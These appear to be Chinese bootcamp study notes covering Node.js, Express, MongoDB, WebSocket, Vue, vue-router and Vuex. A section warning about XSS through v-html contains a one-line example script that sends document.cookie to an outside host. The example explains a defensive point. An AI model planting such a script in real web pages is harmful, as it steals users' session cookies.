# NodeJS
Nodejs是2009由Ryan Dahl推出的运行在服务端的 JavaScript（类似于java,php,python,.net等服务端语言）,
基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。

## day1-2
* 环境
    * nodejs: 10.16.0 / 14.15.4
    * npm: nodejs package management
    * 环境变量
* 模块化开发
    > 模块的作用域为局部作用域
    * 优点
        * 分工
        * 维护
        * 复用
    * 规范
        * commonJS      nodeJS支持的规范（后端）
        * ESModule      ES6模块化（前端）
        * AMD           require.js（前端）
        * CMD           sea.js（前端）
* javascript
    * 前端javascript = ECMAScript + BOM + DOM
        > 在浏览器中运行
    * 后端NodeJS: ECMAScript + 后端概念
        > 在命令行中运行，没有BOM与DOM的概念
* nodeJS多版本共存工具：nvm
    * nvm list  查看已安装nodeJS的版本
    * nvm use   切换nodeJS版本
    * nvm install   安装nodeJS版本
    * nvm uninstall 卸载nodeJS版本
* 运行nodeJS代码
    * REPL：交互式解释器，一般用于测试代码
    * 运行文件： node xxx.js

* commonJS
    * 使用
        > nodeJS把一个文件当作一个模块，都为**局部作用域**，如果想在一个模块中使用另外一个模块的数据，则需要导入导出
        * 导出：
            * `exports`
            * `module.exports`    （推荐）
        * 导入：`require()`
            > 引入模块会自动缓存
            * 引入模块的步骤
                1. 从缓存中引入
                2. 从原生模块引入
                3. 从`node_modules`中引入
                    * package.json
                        * main
                4. 缓存模块

    * 模块分类
        * 内置模块：nodejs自带的模块，可以直接引入，不需要加路径
        * 自定义模块：自己编写的模块，引入时需要添加相对路径
        * 第三方模块: 别人写人模块
            1. 安装：
                * npm install xxx
                * cnpm
                * yarn: 
                    * `yarn add xxx`
                    * `yarn add global xxx`
            2. 引入: 与原生模块一致
* 利用node实现http服务器
    * 请求：request
        > 客户端发给服务器
    * 响应：response
        > 服务器返回给客户端
    * 静态资源
        > html,css,js,img,font,svg....等内容称为静态资源，用来显示这些静态资源的服务器称为静态资源服务器
    * 服务器实现步骤
        * 依赖模块：
            * http
            * fs
                * fs.readFile()/fs.readFileSync()
* nodeJS模块变量
    * __dirname 当前文件所在的路径
    * __filename

## day1-3

### 复习
* 模块化开发
    * 规范
        * commonJS      NodeJS（后端，同步）
        * ESModule      ES6（前端）
            * 导出：export
            * 导入：import
        * AMD           require.js（前端，异步）
        * CMD           sea.js（前端，异步）
            * 导出：define()
            * 导入：require()
    * 分类
        * 内置模块
        * 自定义模块
        * 第三方模块
    * 使用
        * 导出
            * module.exports
            * exports
        * 导入: require()
* nodeJS多版本共存工具：nvm
    * `nvm install [version]`
    * `nvm uninstall [version]`
    * `nvm list`
    * `nvm use [version]`
* http服务器
    > 特点：http(s)请求客户端主动发起，服务器被动响应
    * 请求request
    * 响应response
    * 依赖模块
        * http
        * path
        * fs
        * url
    * mime类型

### 知识点
* express -> Koa
    * express实现静态资源服务器
    ```js
        server.use(express.static('../public'))
    ```
    * express中间件：middleware
        > express中间件是一个函数
        * 分类：
            * 内置中间件
                * express.static()  静态资源服务器中间件
            * 自定义中间件
            * 第三方中间件
        * 使用中间件
            * `use([path],mw1,mw2,mw3....,mwn)`
                * path: 只有路径匹配才进入后面的中间件，如果没有配置path路径则所有请求都进入这个中间件
            * next(): 调用next才能进入下一个中间件
* 利用express中间件实现数据接口
    * 规范：RESTful API
        * 根据请求类型和路径实现不同的接口
    * 请求类型
        * get           查
        * post          增
        * put/patch     改
        * delete        删
    * 获取前端传入参数
        * get请求：通过url参数传到后端，后端通过`req.query`获取
        * 动态路由：后端通过`req.params`获取
        * post/put/patch/delete请求：通过请求体传到后端，后端通过`req.body`获取
            > 利用中间处理不同数据类型:body-parser
            * urlencoded: express.urlencoded
            * json:       express.json()
    * 利用模块化开发思想+路由中间件实现数据接口
        * commonJS
        * express.Router()
## day1-4

### 复习
* express(koa)
    * 中间件middleware
        * 内置中间件
            * express.static()  静态资源服务器
            * express.urlencoded()  处理请求体数据，并格式化到req.body
            * express.json()        处理json数据，并格式化到req.body
            * express.raw()
            * express.Router()      实现模块化路由
        * 自定义中间件
        * 第三方中间件
            * body-parser
    * 使用：use(path,...middleware)
* 路由
    * 数据接口（RESTful API）
        > 利用请求类型与路径实现不同的数据接口
    * 模块化路由
    * 请求类型
        * get       查
        * post      增
        * put/patch 改
        * delete    删
### 知识点
* 图片上传
    * 后端：multer
        * single(field)             单个上传，接收到的文件存入req.file
        * array(field,maxCount)     多个上传，接收到的文件存入req.files
    * 前端：FormData
        * content-type:multipart/form-data
        * set(key,val)
        * append(key,val)
        * get(key)
        * getAll(key)
        * forEach()
        * has()
        * keys()
        * values()
* 跨域
    * 产生跨域的条件：协议、域名、端口三者不一致
    * 为什么会有跨域限制：因为js是一门**客户端脚本语言**（在客户端执行的语言）
    * 跨域解决方案
        * jsonp
            * 原理：利用script标签没有跨域限制的特点来发起请求,返回一段js代码的执行（全局函数的执行代码）
            * 步骤
                1. 定义全局函数
                2. script标签发起请求，传递全局函数名
                3. 删除script，全局函数
        * CORS（推荐）
            * 响应头
                * Access-Control-Allow-Origin
                    * 一个域名
                    * `*`
                * Access-Control-Allow-Methods
                * Access-Control-Allow-Headers
            * 复杂跨域
                * 非GET、HEAD、POST请求。
                * POST请求的Content-Type不是application/x-www-form-urlencoded, multipart/form-data, 或text/plain。
                * 添加了自定义header，例如Token。
        * 服务器代理
            * 原理：利用服务端没有跨域限制的特点在后端向目标服务器发起请求，得到结果后响应给前端
        * 爬虫
            * 原理：爬取目标服务器的所有信息，然后分析过滤得到最终数据
* 页面渲染方式
    * 服务器渲染SSR：html结构在服务器生成并响应给前端，并渲染页面
        > 特点：速度快，SEO友好
        * 步骤
            1. 请求服务器，响应完整的html结构
            2. 浏览器渲染页面
    * 客户端渲染BSR：从服务器请求数据到客户端生成html结构，并渲染到页面
        > 特点：用户体验较好，局部刷新
        * 步骤
            1. 请求服务器，响应一个空的html结构
            2. 浏览器渲染页面，并请求js
            3. 执行js代码，并发起ajax请求
            4. 接收到数据，在客户端生成html结构
            5. 渲染页面
* fs模块
    * 小文件：
        * 读取：fs.readFile()/fs.readFileSync()
        * 写入：fs.writeFile()/fs.writeFileSync()
    * 大文件：Stream
        * 读取流：fs.createReadStream(path)
        * 写入流：fs.createWriteStream(path)

## day1-5

### 复习
* 图片上传
    * FormData
    * multer
* 跨域解决方案
    * jsonp
    * CORS
    * Proxy
    * 爬虫
        * request
        * cheerio
        * 图片：爬取到本地
        * json: 存入本地json
            * fs.writeFile()

### 知识点
* 数据库
    * mySQL
        * 增：insert into
        * 删：delete from 
        * 改：update set
        * 查：select from 
    * MongoDB
        * 增：
            * insertOne(document)
            * insertmany([...document])
        * 删：
            * deleteOne(query)
            * deleteMany(query)
        * 改：
            * updateOne(query,data)
            * updataMany(query,data)
            * save(document)
            ```js
                db.user.updateOne(
                    {username:'laoxie'},
                    {
                        $set:{password:123654,gender:'male'}
                    }
                )
                db.goods.updateOne(
                    {_id:xxx},
                    {
                        // 在原值基础上+1
                        $inc:{hot:1}
                    }
                )
            ```
        * 查: 
            * find(query)
            * findOne(query)

    数据类型     数据库          表/集合          数据
    mySQL       database        table            row
    mongoDB     database        collection       document

    ```js
        [
            {name:'goods1',price:998,sale_price:98},
            {name:'goods2',price:1998,imgurl:'goods2.png',addtime:324597234}
        ]
    ```
* 在Node中使用mySQL
    * 驱动：mysql模块
        * 连接对象
        * 连接池
* 在Node中使用mongodb
    * 驱动：mongodb/mongoose
    * 增删该查的封装

* 项目验收
* 提交最新代码到github
* 上线
* 发邮件
    * 发老谢：xiejinrong@1000phone.com
    * 抄小谢：xiedongling@1000phone.com

    * 邮件内容
        * 原网站地址
        * 上线地址
        * github地址
        * 页面介绍
            * 首页
            * 购物车
            * 注册
            * 登录
        * 截图：至少3张
        * 录视频
* 提交项目到：http://manage.qfh5.cn/

## day2-1

### 复习
* MongoDB CRUD
    * 增：
        * insertOne(document)
        * insertMany([document,...])
    * 删
        * deleteOne(query)
        * deleteMany(query)
    * 改
        * updateOne(query,data)
        * updateMany(query,data)
        * save(document)
        * 修改操作符
            * $set: 修改
            * $inc: 递增
            * $push: 追加
            * $addToSet：添加（自动去重）
            * ...
    * 查
        * find(query)
        * findOne(query)

* 在NodeJS中使用Mongo
    * 驱动：mongodb模块

### 知识点
* http/https特点
    * 短链接：请求并响应完成，连接就会断开
    * 客户端主动，服务器被动
        * 客户端不断发请求：轮询
* WebSocket
    > HTML新特性
    * 长连接：与服务器建立连接后不会断开
    * 客户端
        * 浏览器是否支持WebSocket
        * 方法
            * send()：向服务端推送消息
            * close(): 在客户端断开与服务端的连接
        * 事件
            * open
        ```js
            var socket = new WebSocket('ws://localhost:1001');

            // 客户端向服务器发送消息
            socket.send('hello')
        ```
    * 服务器
        > 依赖模块：ws，能主动发起请求
        * 方法
            * send()    向客户端发送消息
        * 事件
            * connection
        ```js
            const server = new ws.Server({
                port:1001
            });
        ```
    * 应用：多人聊天室（微信群等）
        1. 某个客户端发送消息到服务器
            > 客户端主动
        2. 服务器把消息广播给所有客户端
            > 服务器主动


## day2-2

### 面试题
* 移动端click事件穿透bug
    * 移动端click事件有300ms左右延迟
    * touch
        * touchstart
        * touchend
        * touchmove
    * zepto.js手势
        * tap
        * longtap
        * swiper,swiperLeft,swiperRight,swiperUp,swiperDown

### 知识点
* Vue
    * 思维转变(重要)
        * 从**节点操作**转变成**数据操作**
        * 把节点操作交给Vue框架去处理
    * 数据绑定
        * 单向绑定
            * {{}}
            * v-text
            * v-html
            * v-bind:attr    绑定到属性
        * 双向绑定
            * v-model
                * 数据层->视图层: setter
                * 视图层->数据层: 事件
            * v-model的原理：单向绑定(v-bind)+事件(v-on)
            ```js
                <input type="text" v-model="username" />
                <input type="text" v-bind:value="username" v-on:input="username=$event.target.value">
            ```
    * 指令（html属性）
        * v-model   双向绑定
        * v-text    单向绑定
        * v-html    单向绑定
        * v-bind    属性绑定
        * v-on      事件绑定
        * v-for     遍历
        * v-show    是否显示（显示隐藏）
            > 频繁显示隐藏建议使用v-show
        * v-if      是否显示（节点创建与销毁）
            * v-else-if
            * v-else
* 架构模式
    * MVC
        > 耦合度高
        * Model         数据层
        * View          视图层
        * Controller    控制层
    * MVP
        * Model
        * View
        * Presenter     
    * MVVM
        * Model
        * View
        * ViewModel     
* 响应式属性
    > 特点：监听数据的修改，并自动更新视图
    * 原理：存储器属性getter&setter
    * 在Vue中如何设置响应式属性
        * 设置初始值
        * Vue.set(target,key,val)/this.$set(): 给target添加响应式属性
            > target不能是vue实例和data根数据对象

* 属性特性
    * 值属性（有值的属性）
        * configurable  可配置型
        * enumerable    可枚举性
        * writable      可写性
        * value
    * 存储器属性：属性本身没有值，但可以监听到修改与读取，一般用于代理其他数据
        * configurable 
        * enumerable
        * get
        * set

## day2-3

### 复习
* 响应式属性
    * 核心：存储器属性getter&setter
    * 设置存储器属性的方式
        * data: 实例化Vue时，会遍历data下所有属性，并把它们转成存储器属性
        * Vue.set()/this.$set
* 双向：v-model
    * 单向: v-bind:value
    * 事件
* 指令
    * v-text
    * v-html    慎用，防止xss攻击（过滤破坏性代码），除非你信任数据内容
        ```js
            <script>
                location.href = 'http://laoxie.com?cookie='+document.cookie
            </script>
        ```
    * v-bind
        > 简写： :
    * v-model
    * v-for
    * v-on
        > 简写：@
    * v-show
    * v-if
        * v-else-if
        * v-else


### 知识点
* computed: 计算属性
    > 核心：getter & setter
* 实例属性&方法
    * this.$refs: 保存所有ref属性对应的节点
    * this.$el: 实例化时配置的el（视图对应的节点）
    * this.$data: 实例化时配置的data
    * this.$options: 实例化时的所有配置信息
    * this.$set()/Vue.set()
    * this.$delete()/Vue.delete()
* 事件
    * event
        * 默认为事件处理函数的第一个参数
        * 如果手动传参，需要手动传递event对象
    * 传参
    * 修饰符：
        * 键盘事件修饰符
            * 复制：@keyup.ctrl.67
        * 鼠标事件修饰符
* 过滤器filter
    * 定义
        * 全局过滤器：Vue.filter(name,definition)
        * 局部过滤器: filters
    * 使用：|
        * {{}}
        * v-bind
    * 练习
        * 1000000 -> 1,000,000

## day2-4

### 复习
* computed：计算属性
    > 本质为存储器属性getter&setter
    * 特点：自动缓存，只有在computed属性依赖的数据发生改变时才会重新执行里面的代码，否则从缓存中读取
    ```js
        computed:{
            checkAll(){},
            checkAll:{
                get(){},
                set(){}
            }
        }
    ```
* 实例属性&方法
    * $el
    * $data
    * $refs
    * $options
    * $props
    * $attr
    ```js
        new Vue({
            ...
        })
    ```
    * $set()/Vue.set()
    * $delete()/Vue.delete()
* 全局方法（Vue静态方法）
    * Vue.set()
    * Vue.delete()
    * Vue.filter()
* 事件
    > 事件绑定完整格式：v-on:事件类型.修饰符="事件处理函数"
    * 绑定：v-on, @
    * event
        * 默认事件处理函数的第一个参数
        * 如果传参，则需手动传递$event
    * 传参
        ```js
            <button @click="change"></button>
            <button @click="change(id,$event)"></button>
        ```
    * 修饰符
        * 键盘事件修饰符
        * 鼠标事件修饰符
* 过滤器
    * 定义
        * 全局  Vue.filter(name,definition)
            * definition是一个函数，第一个参数为待过滤的值，后面的为过滤器参数（可选）
        * 局部  filters
    * 使用：|
        > 可以同时使用多个过滤器
        * 在{{}}中使用
        * 在v-bind中使用

### day2-4
* 组件化开发
    > 封装、模块化
    * 优点
        * 分工更容易
        * 维护更方便
        * 复用
    * 定义
        > 组件就是Vue实例（定义一个组件可以理解为创建一个标签）
        * 全局组件: Vue.component(name,options)
        * 局部组件: components:{name1:options,name2:options}
    * 使用
        ```js
            <组件名/>
            <组件名></组件名>
        ```
    * 配置参数
        * el        视图属性，组件配置没有
        * template  模板属性
        * render    渲染方法
    * 组件通讯
        * 父->子：props
            1. 父组件操作：给子组件定义属性并传递数据
            2. 子组件操作：
                1. props接收数据，接收的数据会自动称为实例的属性
                    > 注意大小写问题
                    * 如果不接收，则props属性自动成为组件根元素的属性
                    * props数据类型校验
                        * 类型
                        * 必填
                        * 默认值
                2. 在组件中通过this.xxx使用
        * 子->父
            1. 父组件操作：给子组件自定义事件，并传递父组件的方法作为事件处理函数
                > v-on:事件="父组件方法"
            2. 子组件操作：子组件通过`this.$emit(type,data)`触发自定义事件

* 模块化开发todolist
    1. 划分组件
    2. 定义组件
    3. 组件通讯
        * 父->子：props
        * 子->父：
            * 自定义事件
            * 把父组件函数传到子组件执行
        * 多层级组件
            * 逐层传递（不推荐）
            * Bus事件总线
                1. 定义一个父组件和子组件都能访问到的Vue实例
                2. 接收方给Bus绑定事件，事件处理函数为接收方的方法
                    > Bus.$on()
                3. 发送方触发Bus事件，并传递参数
                    > Bus.$emit()

## day2-5

### 知识点
* key
    > key一定是**唯一**且**稳定**的值
    * 在Vue中，为了提高页面性能，Vue会尽量较少节点操作（对比节点的前后状态，过滤掉一些没必要的节点操作(找出差异项)）
        * 如过Vue无法判断前后节点的对应状态，为了提升性能，采用**复用原则**（不对节点进行创建与销毁，而是改变它的内容）
        * diff算法
            * 虚拟节点（VirtualDOM）：一个结构类似于真实DOM节点的js对象
            ```js
            // 初始状态
                {
                    type:'p',
                    props:{},
                    children:[{
                        type:'span',
                        props:{},
                        children:'laoxie',
                        key:11
                    },{
                        type:'strong',
                        props:{},
                        children:'xxx'
                        key:12
                    }]
                    key:1
                }

                // 结束状态
                {
                    type:'p',
                    props:{},
                    children:[{
                        type:'span',
                        props:{},
                        children:'tiantian'
                        key:11
                    },{
                        type:'strong',
                        props:{},
                        children:'xxx'
                        key:12
                    }]
                    //key:1
                }
            ```

## day3-1

### 复习
* 虚拟DOM
    > 虚拟节点（js对象）, diff算法, Vue的diff算法会对比虚拟DOM前后状态，找出差异项，然后更新差异项
    * 节点的频繁操作会影响页面性能
        ```js
            btn.innerText = 10;
            btn.innerText = 20;
            btn.innerText = 30;
            btn.innerText = 10;

            setter(){

                render()
            }

            // 创建与写入
            let btn = document.createElement('button')
            btn.innerText = 'xxx'
            document.body.appendChild(btn);
            // 销毁
            document.body.removeChild(btn)
        ```
    * key
        > 作为虚拟节点的标识，值需要唯一且稳定，建议在for循环中都添加key


### 知识点
* Vue-cli： Vue脚手架
    * 安装：
        ```bash
            #npm 
            npm install -g @vue/cli

            #yarn
            yarn global add @vue/cli
        ```
    * 创建项目
        ```bash
            vue create myapp
        ```
    * webpack构建工具
        * vue-loader
* 单文件组件
    > 后缀名为：`.vue`
* Vue版本
    * 完整版=运行时+编译器
    * 运行时版本（runtime）
    * 编译器:来将模板字符串编译成为 JavaScript 渲染函数的代码

* 模块化
    * 规范
        * CommonJS      NodeJS
        * ESModule      ES6
        * AMD           require.js
        * CMD           sea.js
    * 导出: export
        >  export后只能跟function、class、var、let、const、default、{}
    * 导入: import
        > 只能静态引入
    * 基本特点
        * 每一个模块只加载一次， 并执行一次，再次加载同一文件，直接从内存中读取；
        * 每一个模块内声明的变量都是局部变量， 不会污染全局作用域；
        * 通过export导出模块，通过import导入模块
        * ES6模块只支持静态导入和导出，只可以在模块的最外层作用域使用import和export 
        ```js
            let path = './home.js'
            // commonsJS
            const home = require('./home.js')
            const home = require(path)

            // ESModule
            import home from './home.js'
            //import home from path; // 不能使用动态路径

            if(xxx){
                import home from './home.js'
            }
        ```
* ESLint
    > 代码规范工具

## day3-2

### 复习
* vue-cli脚手架
    > webpack
    * vue.config.js
* ESModule
    * 导入
        * import xxx from url
        * import {xxx} from url
        * import * as Module from url
    * 导出
        * export    给**模块对象**添加属性
            * var, let, const
            * function
            * class
            * default
            * {}
    * 应用
        * webpack
        * 浏览器
        ```html
            <script type="module">
        ```

### 知识点
* SPA（Single Page Application）: 单页Web应用
    > 一个应用只有一个页面index.html
* MPA（Multiple Page Application）：多页面应用
* vue-router
    * 使用步骤
        1. 安装并引入
            ```js
                // npm i -D vue-router
                import VueRouter from 'vue-router'
            ```
        2. 使用VueRouter插件
            ```js
                Vue.use(VueRouter);
            ```
        3. 实例化路由并配置参数
            ```js
                const router = new VueRouter({
                    // mode:'hash',// history
                    routes:[
                        {
                            path:'/home',
                            component:Home
                        },
                        {
                            path:'/reg',
                            component:Reg
                        },
                        {
                            path:'/login',
                            component:Login
                        }
                    ]
                })
            ```
        4. 把路由注入根实例
            ```js
                new Vue({
                    router
                    ...
                })
            ```
        5. 设置路由组件显示位置
            > 把<router-view/>放到合适的位置
    * 路由类型
        > 通过路由配置的mode属性设置
        * hash
            > url地址有`#`
        * history
            > url没有`#`，更像一个网站
    * 全局组件
        * <router-view/>    用于显示路由组件内容
            * name          命名视图
        * <router-link/>    用于路由跳转
            * to
                * String
                * Object
            * tag
            * event
            * replace
            * active-class
            * exact-active-class
    * 路由跳转
        > 可以通过`path`跳转，也可以通过`name`跳转
        * 声明式导航
        * 编程式导航
            * $router   路由对象
                * push()        跳转并产生浏览记录
                * replace()     跳转但不产生浏览记录
                * go(n)
                * back()
                * forward()
            * $route    当前路由信息

* Vue的UI框架
    * element-ui    饿了么
    * iView         腾讯
    * ant-design    蚂蚁
    * vantUI        有赞

## day3-3

### 复习
* webApp分类
    * SPA
    * MPA
* VueRouter
    * 使用步骤
        1. 安装
        2. 引用并使用插件
        3. 实例化并配置参数
        4. 把实例注入Vue根实例
        5. 设置路由组件显示位置：<router-view/>
            > 命名视图
        
    * 参数
        * mode: hash,history
        * routes
            * path
            * component
            * components
            * name      命名路由
    * 路由跳转
        * 声明式导航：<router-link> 
        * 编程式导航
            * $router   用于跳转
            * $route    当前路由信息

    * ajax请求
        * 原生
            * XMLHttpRequest
            * fetch
        * jQuery/zeptoJS
        * axios
### 知识点
* 加密知识
    * 单向加密
        > 不可逆过程，加密后不能解密
        * 缺点：虽然不能解密，但可以暴力破解
            * 字典破解
        * 解决
            * 限制次数
            * 多次加密
    * 双向加密
        > 加密后可解密
        * 对称加密
            > 加密解密共用一个密钥
            * 缺点：钥匙管理不安全
        * 非对称机密
            * 公钥
            * 私钥
            * 缺点：性能差
        > 解决方案：使用对称加密加密数据，使用非对称加密加密密钥

        * 实际应用：https
            * http: 
                > 端口:80
            * https: ssl
                > 端口：443

* watch
    * 可以监听组件实例下的所有属性（包括属性的子属性）
    * 当监听的属性被修改时，执行相应的函数
    ```js
        watch:{
            username(newVal,oldVal){

            },
            'ruleForm.username':function(newVal,oldVal){

            }
        }
    ```
    > 利用生命周期函数+watch实现导航高亮

* 生命周期函数

## day3-4

### 面试题
* 如何取消ajax请求
    * xhr.abort()
    * axios

### 复习
* 加密知识
    * 单向
    * 双向
        * 对称
        * 非对称
        * https
* watch
    > 监听实例属性（包括子属性）
* 路由传参
    * 动态路由：$route.params


### 知识点
* 局部样式/组件样式
    > 原理：属性选择器
    * scoped： style标签添加scoped属性后，Vue单文件组件在编译时自动给标签添加`data-v-[hash]`自定义属性，然后利用css的是属性选择器实现局部样式
* 面向对象css

* 路由传参
    * 跳转传参
        * 动态路由
            1. 路由配置
            2. 跳转传参
                * $router.push('/goods/123')
                * $router.push({name:'goods',params:{id:123}})
                    > 有多个变量的路由，推荐使用该方式
            3. 接收参数: this.$route.params
        * params
            * 动态路由参数（刷新后依然存在）
            * 非动态路由参数（刷新后消失）
        * query
            > 通过url参数传递
    * 定义传参
        * meta  
        * props
            * Object
            * Function
* 数据持久化
    > 刷新后数据依然存在
* 生命周期函数（钩子函数）
    > 所有生命周期函数中的this指向实例
    * 创建阶段
        * beforeCreate()
        * created()
    * 挂载阶段
        * beforeMount()
        * mounted()
    * 更新阶段
        * beforeUpdate()
        * updated
    * 销毁阶段
        * beforeDestroy
        * destroyed
* 生命周期函数执行过程
* 每个生命周期函数中适合做什么操作
    * created
        * ajax请求
    * mounted
        * 节点操作，定时器
    * destroyed
        * 取消ajax请求，清除定时器等

## day3-5

### 面试题
* 如何取消ajax请求
    * XMLHttpRequest
        > xhr.abort()
    * axios
        1. 给请求添加表示token
        2. 通过cancel()方法取消请求

### 复习
* 路由传参
    * 定义路由时传参
        * meta
        * props
            * Boolean   把$route.params通过props传入组件
            * Object
            * Function
    * 跳转时传参
        * 动态路由
            > 获取：$route.params
        * params
            > 获取：$route.params
        * query
            > 获取：$route.query
    * 数据持久化
        > 刷新后数据依然存在
* 生命周期函数
    * 有哪些生命周期函数
        * 创建阶段
            * beforeCreate
            * created
        * 挂载阶段
            * beforeMount
            * mounted
        * 更新阶段
            * beforeUpdate
            * updated
        * 销毁阶段
            * beforeDestroy
            * destroyed
    * 生命周期函数的执行过程
    * 每个生命周期函数适合做哪些操作

* 组件通讯
    * 父->子：props
    * 子->父：
        * 把父组件方法传到子组件执行
        * 自定义事件
            * v-on/$on()
            * $emit()
    * 兄弟
    * 深层次组件通讯
        * 逐层传递
        * 事件总线 Bus/$root
            * $on()
            * $off()
            * $emit()
    * 组件层级
        * $root     根组件
        * $parent   父组件
        * $children 子组件
    * $ref
        * 用在html元素上，得到节点
        * 用在组件上，得到组件实例
        > 如何在父组件调用子组件方法

### 知识点
* 插槽slot
    * `<slot/>`； 用于承载组件内容
    * 父->子: `v-slot:插槽名称`
        * 默认插槽：名字为default的插槽（default可以省略）
        * 具名插槽：有名字的插槽
            * 使用v-slot指令来显示内容
    * 子->父：作用域插槽`v-slot:插槽名称="scope"`

* VueX
    * 解决的问题
        * 数据共享
        * 监听数据修改，并自动刷新组件
    * 核心配置
        * state     类似于组件的data
        * getters   类似于组件中的computed
        * mutations 唯一修改State的方式，类似于组件中的methods
            > 触发mutation的方式：store.commit('mutation',参数)
    * 使用步骤
        1. 安装并引用
            ```js
                import Vuex from 'vuex'
            ```
        2. 使用Vuex插件
            ```js
                Vue.use(Vuex)
            ```
        3. 实例化Store，并配置核心参数
            ```js
                const store = new Vuex.Store({
                    state,
                    getters,
                    mutations,
                })
            ```
        4. 把store注入Vue根实例
            ```js
                new Vue({
                    //..
                    store
                })
            ```
        5. 使用
            * 获取：在组件中使用state：this.$store.state.xxx
            * 修改：this.$store.commit('mutation',参数)

* 路由守卫
    * 全局守卫
        > 是路由实例的方法，在路由配置文件中编写
        * router.beforeEach(to,from,next)
        * router.resolve(to,from,next)
        * router.afterEach(to,from)
    * 路由独享的守卫
        > 在路由配置中编写
    * 组件内守卫
        > 在组件中编写，类似于生命周期函数
        * beforeRouteEnter(to,from,next)
            > 此时路由组件没有创建完毕，因此不能访问this
        * beforeRouteUpdate(to,from,next)
        * beforeRouteLeave(to,from,next)

    * 应用：页面访问权限控制
        > 建议在router.beforeEach()全局守卫中处理页面访问权限

## day4-2

### 复习
* vuex的作用：数据共享
* 核心配置
    * state             data
    * getters           computed
        * 参数
            * state
    * mutations         methods
        > store.commit(mutation,payload)
        * 参数
            * state
            * payload  
* 使用步骤
    1. 安装引入
    2. 使用
        > Vue.use()
    3. 实例化Store
        ```js
            const store = new Vuex.Store({
                // 核心配置
            })
        ```
    4. 注入Vue根实例
        > 注入后，会给Vue的所有组件添加`$store`
    5. 使用
        * this.$store.state
        * this.$store.getters
        * this.$store.commit()

### 知识点
* 核心配置
    * state             data
    * getters           computed
    * mutations         methods
        > 修改state的唯一方式
        ```js
            // 同步操作
            store.commit('add',goods);

            // 如果数据需要异步获取
            axios.get('/getgoods').then(res=>{
                store.commit('add',res.goods);
            })
        ```
    * actions           methods  
        > 一般用于异步操作，调用方式：store.dispatch(action,payload)
        1. ajax请求，并返回数据
        2. 在action中触发mutation 
    * modules
        > store模块化，默认影响state的获取，getters,mutations,actions不受影响，如果需要独立操作当前模块的getters,mutations,actions，需要设置namespaced:true
* Vuex映射
    * mapState      映射vuex中的state到组件的computed
    * mapGetters    映射Vuex中的getters到组件的computed
    * mapMutations  映射Vuex中的mutations到组件的methods
    * mapActions    映射Vuex中的actions到组件的methods

## day4-5

### 知识点
* 组件
    * 全局：Vue.component(name,options)
    * 局部：components:{name:options}
* 过滤器
    * 全局：Vue.filter(name,definition)
    * 局部：filters:{name:definition}
* 指令
    * 全局：Vue.directive(name,option)
    * 局部：directives:{name:option}
    ```js
        <div v-pre>{{username}}</div>
    ```
* mixin混入
    * 全局：Vue.mixin()
    * 局部：mixins
* provide / inject 依赖注入

    ```js
        // App.vue
        export default {
            data(){
                return {}
            },
            // 父组件使用provide提供依赖
            provide:{
                userInfo:{
                    username:'laoxie',
                    password:123456
                }
            }
            components:{
                datalist:{
                    data(){
                        return {}
                    },
                    //inject:['userInfo'],
                    inject:{
                        //user:'userInfo',
                        user:{
                            from:'userInfo',
                            default:{username:'游客',password:123456}
                        }
                    },
                    mounted(){
                        //this.userInfo
                        this.user
                    }
                }
            }
        }
    ```
* Vue插件
    > 插件可以是一个对象（必须提供 install 方法）。也可以是一个函数，它会被作为 install 方法。并把 Vue 作为参数传入

    ```js
        // 定义一个Vue的插件
        const myPlugin = {
            install(){

            }
        }
        const myPlugin2 = function(){

        }

        Vue.use(myPlugin)
    ```